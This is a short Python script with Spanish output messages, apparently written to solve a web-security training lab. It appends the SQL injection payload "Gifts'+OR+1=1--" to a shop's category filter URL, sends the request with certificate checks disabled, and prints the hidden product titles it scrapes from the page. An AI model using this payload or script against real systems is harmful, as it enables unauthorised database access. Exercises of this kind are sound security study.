#!/usr/bin/env python3
import requests
import urllib3
import sys
import re
from bs4 import BeautifulSoup
urllib3.disable_warnings()

gyC="\033[0;37m\033[1m"
yC="\033[0;33m\033[1m"
bC="\033[0;34m\033[1m"
gC="\033[0;32m\033[1m"
rC="\033[0;31m\033[1m"
eC="\033[0m"

def inyeccion(url):
    url=url+"/filter?category=Gifts'+OR+1=1--"
    try:
        print(f"\n{yC}[+]{gyC} Realizando peticion a {url}\n")
        response = requests.get(url,verify=False)
        #print(response.status_code)
        if response.status_code != 200:
            print(f"\n{rC}[!] Verifica la url {eC}\n")
            sys.exit(1)

        arbol = BeautifulSoup(response.text,"lxml")
        contenedorTitulos = arbol.find("section", attrs={"class":"container-list-tiles"})
        titulos = contenedorTitulos.find_all("h3")
        print(f"{yC}[+] {gyC}Productos:{eC}\n")
        for titulo in titulos:
            t = re.search("<h3>([^<]*)</h3>",str(titulo)).group(1)
            print(f"\t{t}")
        
    except Exception as e:
        print(f"\n{rC}[!] Verifica la url ingresada{eC}\n")
        sys.exit(1)
    
if __name__ == "__main__":
    if len(sys.argv)!=2:
        print(f"\n{yC}[+] {gyC}Uso: {gC}{sys.argv[0]} {bC}http://ejemplo.com{eC}")
        sys.exit(1)
    inyeccion(sys.argv[1].strip("/"))
